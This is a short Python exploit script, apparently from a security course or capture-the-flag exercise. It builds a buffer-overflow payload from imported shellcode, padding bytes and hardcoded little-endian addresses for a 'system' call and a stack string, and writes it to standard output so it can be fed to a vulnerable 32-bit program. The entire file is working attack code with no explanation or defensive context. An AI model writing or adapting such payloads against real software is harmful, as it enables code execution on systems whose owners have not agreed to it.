
import sys
from shellcode import shellcode
addr = 0x804fef0.to_bytes(4, "little") #system address
addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
sys.stdout.buffer.write(shellcode + b"A"*3 + addr + addr2)
